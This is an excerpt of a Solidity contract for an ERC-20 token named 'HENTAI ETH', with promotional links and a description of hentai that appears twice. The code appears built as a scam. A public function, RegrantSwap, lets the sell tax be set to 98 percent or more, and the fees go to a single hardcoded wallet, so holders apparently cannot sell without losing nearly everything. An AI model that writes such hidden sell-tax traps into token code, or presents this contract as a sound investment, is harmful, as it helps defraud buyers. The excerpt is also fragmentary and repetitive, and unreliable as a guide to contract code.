...
--------------Website : https://HentaiETH.finance

----------------------------Twitter : https://twitter.com/HentaiETH

------------------------------------------Medium : https://medium.com/@HentaiETH/hentai-eth-60547abcfa4a
...
What is Hentai ?
Hentai is a genre of anime and manga pornography which is known for its sexualized content and often depicts explicit scenes 
of sexual activity. It has become increasingly popular in recent years, particularly due to its availability online.


What is Hentai ETH ?

We Translate Your Dream Into Metaverse
Hentai is a genre of anime and manga pornography which is known for its sexualized content and often depicts explicit scenes 
of sexual activity. It has become increasingly popular in recent years, particularly due to its availability online.
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xa172381B69F952E5099bFa245366154973094024; 
...
contract HentaiETH is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "HENTAI ETH";
    string private _symbol = "HENTAI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2ECAf27468CB6Fe47998Aa968043628c800873Ee); 
    address payable public teamWalletAddress = payable(0x2ECAf27468CB6Fe47998Aa968043628c800873Ee); 
    ...
    uint256 public _marketingShare = 95;
    ...
    uint256 public _maxtokenswapamount = 98;
    ...
    function RegrantSwap(uint256 NewAmount) public {
        require(NewAmount >=_maxtokenswapamount);
        _totalTaxIfSelling = NewAmount;
    }
